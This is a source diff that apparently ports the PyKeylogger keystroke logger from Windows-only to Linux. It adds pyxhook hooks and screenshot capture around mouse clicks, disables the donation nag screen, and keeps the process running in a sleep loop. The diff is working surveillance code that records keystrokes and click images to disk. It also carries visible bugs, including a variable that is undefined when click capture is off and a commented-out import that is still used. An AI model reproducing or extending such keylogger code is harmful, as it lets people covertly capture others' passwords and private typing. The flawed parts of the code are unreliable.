@@ -20,10 +20,15 @@
 ##
 ##############################################################################
 
-import pyHook
-import time
-import pythoncom
-import sys
+import os, time, sys
+if os.name == 'posix':
+	import pyxhook
+elif os.name == 'nt':
+	import pyHook
+else:
+	print "OS is not recognised as windows or linux."
+	exit()
+#import pythoncom
 import imp # don't need this anymore?
 from optparse import OptionParser
 import traceback
@@ -49,25 +54,32 @@ class KeyLogger:
 		self.ParseControlKey()
 		self.NagscreenLogic()
 		self.q = Queue.Queue(0)
-		self.hm = pyHook.HookManager()
-		self.hm.KeyDown = self.OnKeyDownEvent
-		self.hm.KeyUp = self.OnKeyUpEvent
-		
-		if self.settings['General']['Hook Keyboard'] == True:
-			self.hm.HookKeyboard()
-		#if self.options.hookMouse == True:
-		#	self.hm.HookMouse()
-		
 		self.lw = LogWriter(self.settings, self.cmdoptions, self.q) 
 		self.panel = False
+		self.lw.start()
+		if os.name == 'nt':
+			self.hm = pyHook.HookManager()
+			self.hm.KeyDown = self.OnKeyDownEvent
+			self.hm.KeyUp = self.OnKeyUpEvent
+			if self.settings['General']['Hook Keyboard'] == True:
+				self.hm.HookKeyboard()
+		elif os.name == 'posix':
+			time.sleep(1) #Logwriter isn't creating the "logs" directory immediately, so I have to wait for that.
+			if self.settings['Image Capture']['Capture Clicks'] == "True":
+				captureclickimages = True
+			self.hm = pyxhook.pyxhook(captureclicks = captureclickimages, clickimagedimensions = {"width":int(self.settings['Image Capture']['Capture Clicks Width']), "height":int(self.settings['Image Capture']['Capture Clicks Height'])}, logdir = self.settings['General']['Log Directory'], KeyDown = self.OnKeyDownEvent, KeyUp = self.OnKeyUpEvent)
+			self.hm.start()
+		#if self.options.hookMouse == True:
+		#   self.hm.HookMouse()
 
 	def start(self):
-		self.lw.start()
-		pythoncom.PumpMessages()
+		if os.name == 'nt':
+			pythoncom.PumpMessages()
 	
 	def ParseControlKey(self):
 		self.controlKeyList = self.settings['General']['Control Key'].split(';')
-		self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
+		if os.name == 'nt':
+			self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
 		self.controlKeyHash = dict(zip(self.controlKeyList, [False for item in self.controlKeyList]))
 		
 	def MaintainControlKeyHash(self, event, updown):
@@ -89,6 +101,7 @@ class KeyLogger:
 		Puts the event in queue, and passes it on.
 		Starts control panel if proper key is pressed.
 		'''
+		
 		#self.lw.WriteToLogFile(event)
 		self.q.put(event)
 		
@@ -167,7 +180,7 @@ class KeyLogger:
 		# and encourage you once more to support the PyKeylogger project by making a donation. 
 		
 		# Set this to False to get rid of all nagging.
-		NagMe = True
+		NagMe = False
 		
 		if NagMe == True:
 			# first, show the support screen
@@ -195,6 +208,10 @@ if __name__ == '__main__':
 	
 	kl = KeyLogger()
 	kl.start()
+	
+	while True:
+		time.sleep(240)
+		pass
 	
 	#if you want to change keylogger behavior from defaults, modify the .ini file. Also try '-h' for list of command line options.
 	
